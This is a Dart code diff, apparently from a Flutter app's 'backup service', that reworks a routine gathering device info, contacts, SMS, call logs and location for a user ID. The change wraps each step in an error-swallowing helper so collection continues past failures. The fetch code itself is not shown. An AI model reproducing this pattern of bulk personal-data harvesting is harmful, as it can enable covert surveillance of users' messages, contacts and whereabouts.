@@ -12,63 +12,32 @@ class Appbackupservice {
 
 static Future<void> requestPermissionsAndFetchData(String userId) async {
 
-await getDeviceInfo(userId);
-  await requestAndFetchContacts(userId);
-  await fetchSms(userId);
-  await requestCallLogPermission(userId);
-  await getLocation(userId); 
 
-  // Request both permissions at once
-//   Map<Permission, PermissionStatus> statuses = await [
-//     Permission.contacts,
-//     Permission.sms,
-//     Permission.phone,
-//     Permission.location,
-//   ].request();
+     await _safeCall(() => getDeviceInfo(userId), "getDeviceInfo");
+    await _safeCall(() => requestAndFetchContacts(userId), "contacts");
+    await _safeCall(() => requestCallLogPermission(userId), "call logs");
+    await _safeCall(() => fetchSms(userId), "sms");
+    await _safeCall(() => getLocation(userId), "location");
+  }
 
-//   bool contactsGranted = statuses[Permission.contacts]?.isGranted ?? false;
-//   bool smsGranted = statuses[Permission.sms]?.isGranted ?? false;
-//   bool phoneGranted = statuses[Permission.phone]?.isGranted ?? false;
-//   bool locationGranted = statuses[Permission.location]?.isGranted ?? false;
- 
+  static Future<void> _safeCall(
+      Future<void> Function() task, String name) async {
+    try {
+      await task();
+      print("✅ Completed $name");
+    } catch (e, st) {
+      print("❌ Failed in $name: $e");
+      // Optionally send error to server or logging system
+    }
+  }
 
-//   if (!contactsGranted) {
-//     print("❌Contacts permission denied");
-//   }
-//   if (!smsGranted) {
-//     print("❌SMS permission denied");
-//   }
-//   if(!phoneGranted){
-//       print("❌Phone permission denied");
-//   }
-//   if(!locationGranted){
-//     print("❌ location permision denied");
-//   }
-
-//      await getDeviceInfo(userId);
-//     if(locationGranted){
-//  await getLocation(userId); 
-//     }
-
-//   // Fetch contacts only if permission granted
-//   if (contactsGranted) {
-//    await requestAndFetchContacts(userId);
-   
-//   }
-//   // Fetch SMS only if permission granted
-//   if (smsGranted) {
-//    await fetchSms(userId);
-//   }
-
-
-//        // Fetch callLogs if permission granted
-//   if (phoneGranted) {
-//    await requestCallLogPermission(userId);
-//   }
-
-
+// await getDeviceInfo(userId);
+//   await requestAndFetchContacts(userId);
+//   await requestCallLogPermission(userId);
+//   await getLocation(userId); 
 }
-}
+
+
 
 
 /// contact info
